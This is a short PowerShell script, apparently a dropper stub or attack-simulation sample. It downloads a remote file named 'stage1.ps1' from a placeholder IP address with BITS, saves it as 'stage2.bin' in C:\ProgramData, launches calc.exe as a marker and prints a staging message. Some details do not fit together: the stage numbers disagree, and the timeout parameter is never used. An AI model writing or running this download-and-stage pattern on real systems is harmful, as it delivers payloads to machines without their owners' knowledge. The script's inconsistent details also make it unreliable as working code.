
[CmdletBinding()]
param(
    [string]$TargetUrl = "https://192.0.2.236:443/stage1.ps1",
    [string]$Stage2Path = 'C:\ProgramData\stage2.bin',
    [int]$TimeoutSec = 148
)
Start-BitsTransfer -Source $TargetUrl -Destination $Stage2Path
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Write-Output "stage 32 initialized"
